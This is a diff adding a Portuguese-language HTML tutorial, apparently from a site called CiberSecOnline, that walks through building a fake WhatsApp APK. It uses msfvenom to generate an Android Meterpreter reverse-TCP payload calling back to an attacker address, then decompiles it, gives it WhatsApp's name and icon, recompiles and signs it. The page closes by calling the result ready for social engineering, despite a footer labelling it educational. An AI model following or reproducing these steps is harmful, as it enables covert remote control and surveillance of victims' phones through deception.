@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Engenharia Social - WhatsApp Espião</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header>
+    <h1>Criação de APK Falso - WhatsApp Espião</h1>
+  </header>
+
+  <div class="container">
+    <p><strong>Objetivo:</strong> Transformar um APK malicioso em um app falso com nome e ícone do WhatsApp, assinado e funcional.</p>
+
+    <section>
+      <h2>Etapa 1 - Instalação dos Requisitos</h2>
+      <pre><code>sudo apt update
+sudo apt install apktool openjdk-17-jdk zipalign -y</code></pre>
+    </section>
+
+    <section>
+      <h2>Etapa 2 - Gerar o Payload</h2>
+      <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk</code></pre>
+    </section>
+
+    <section>
+      <h2>Etapa 3 - Descompilar com apktool</h2>
+      <pre><code>apktool d payload.apk -o fakeapp</code></pre>
+    </section>
+
+    <section>
+      <h2>Etapa 4 - Personalizar Nome e Ícone</h2>
+      <h3>1. Alterar Nome</h3>
+      <p>Editar o arquivo:</p>
+      <pre><code>res/values/strings.xml</code></pre>
+      <p>Conteúdo:</p>
+      <pre><code>&lt;resources&gt;
+  &lt;string name="app_name"&gt;WhatsApp Espião&lt;/string&gt;
+&lt;/resources&gt;</code></pre>
+
+      <h3>2. Inserir Ícone Falso</h3>
+      <p>Criar as pastas:</p>
+      <pre><code>mkdir -p res/mipmap-hdpi res/mipmap-mdpi res/mipmap-xhdpi res/mipmap-xxhdpi res/mipmap-xxxhdpi</code></pre>
+      <p>Copiar o ícone para todas:</p>
+      <pre><code>cp ic_launcher.png res/mipmap-hdpi/ic_launcher.png
+cp ic_launcher.png res/mipmap-mdpi/ic_launcher.png
+cp ic_launcher.png res/mipmap-xhdpi/ic_launcher.png
+cp ic_launcher.png res/mipmap-xxhdpi/ic_launcher.png
+cp ic_launcher.png res/mipmap-xxxhdpi/ic_launcher.png</code></pre>
+      <p>Alterar o Manifest:</p>
+      <pre><code>&lt;application android:label="@string/app_name" android:icon="@mipmap/ic_launcher"&gt;</code></pre>
+    </section>
+
+    <section>
+      <h2>Etapa 5 - Recompilar o APK</h2>
+      <pre><code>apktool b fakeapp -o whatsapp_fake.apk</code></pre>
+    </section>
+
+    <section>
+      <h2>Etapa 6 - Assinar o APK</h2>
+      <h3>1. Gerar keystore</h3>
+      <pre><code>keytool -genkey -v -keystore mykey.keystore -alias hackerkey -keyalg RSA -keysize 2048 -validity 10000</code></pre>
+      <h3>2. Assinar com jarsigner</h3>
+      <pre><code>jarsigner -verbose -keystore mykey.keystore whatsapp_fake.apk hackerkey</code></pre>
+      <h3>3. Alinhar o APK</h3>
+      <pre><code>zipalign -v 4 whatsapp_fake.apk whatsapp_final.apk</code></pre>
+    </section>
+
+    <section>
+      <h2>Resultado Final</h2>
+      <p>O arquivo <code>whatsapp_final.apk</code> está pronto para ser usado em engenharia social. Possui nome, ícone e funcionamento convincente.</p>
+    </section>
+  </div>
+
+  <footer>
+    <p>&copy; 2025 - CiberSecOnline | Projeto educacional - Engenharia Social</p>
+  </footer>
+</body>
+</html>
